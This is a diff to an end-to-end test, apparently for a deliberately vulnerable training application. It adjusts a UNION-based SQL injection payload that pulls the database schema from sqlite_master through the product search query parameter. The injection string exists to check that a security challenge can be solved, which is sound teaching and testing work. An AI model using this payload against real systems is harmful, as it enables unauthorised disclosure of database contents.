@@ -41,7 +41,7 @@ describe('/rest/products/search', () => {
 
   describe('challenge "dbSchema"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
-      browser.driver.get(browser.baseUrl + '/rest/products/search?q=\')) union select null,sql,null,null,null,null,null,null from sqlite_master--')
+      browser.driver.get(browser.baseUrl + '/rest/products/search?q=\')) union select null,sql,null,null,null,null,null,null,null from sqlite_master--')
     })
 
     protractor.expect.challengeSolved({ challenge: 'Database Schema' })
